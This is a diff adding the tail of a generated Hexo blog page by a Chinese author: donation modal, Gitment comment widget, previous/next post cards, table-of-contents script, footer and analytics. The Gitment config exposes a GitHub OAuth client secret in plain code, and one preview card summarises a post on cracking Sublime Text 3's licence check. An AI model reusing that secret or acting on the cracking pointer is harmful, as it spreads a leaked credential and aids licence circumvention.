+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechatpay.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+        </div>
+    </div>
+
+    
+
+    
+        <link rel="stylesheet" href="/libs/gitment/gitment-default.css">
+<link rel="stylesheet" href="/css/gitment.css">
+
+<div class="gitment-card card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitment-content" class="card-content"></div>
+</div>
+
+<script src="/libs/gitment/gitment.js"></script>
+<script>
+var gitment = new Gitment({
+    id: 'Sat Apr 27 2019 22:12:07 GMT+0000',
+    owner: 'fengwenhua',
+    repo: 'fengwenhua.github.io',
+    oauth: {
+        client_id: '487b675438c149b5818b',
+        client_secret: '501477eec1e2ed9f27751d02281b5834021d6c7b'
+    }
+});
+
+gitment.render('gitment-content');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/04/28/sublime-text-3-ji-huo/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="sublime text 3 激活">
+                        
+                        <span class="card-title">sublime text 3 激活</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            1. 原文链接
+https://www.52pojie.cn/thread-925256-1-1.html
+
+2. 修改trigger2.1. Windows
+利用010Editor打开软件根目录下的sublime_text.exe
+搜索1
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-04-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/软件配置/" class="post-category">
+                                    软件配置
+                                </a>
+                            
+                            <a href="/categories/软件配置/sublime-text-3/" class="post-category">
+                                    sublime text 3
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/st3激活/">
+                        <span class="chip bg-color">st3激活</span>
+                    </a>
+                    
+                    <a href="/tags/sublime-text-3-激活/">
+                        <span class="chip bg-color">sublime text 3 激活</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/03/11/php-ruo-lei-xing/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="PHP弱类型">
+                        
+                        <span class="card-title">PHP弱类型</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            参考：PHP弱类型安全问题总结 | 乘物游心
+PHP弱类型简介
+在PHP中，可以进行以下的操作。
+
+$param = 1;
+$param = array();
+$param = "stringg";
+
+
+弱类型的语言对变量的数据类型没有限制
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-03-10
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/渗透测试/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/php弱类型/">
+                        <span class="chip bg-color">php弱类型</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2018</span>
+            <a href="https://www.fengwenhua.top" target="_blank">冯文华</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">141.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/fengwenhua" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:807296772@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=807296772" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 807296772" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140817753-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-140817753-1');
+</script>
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
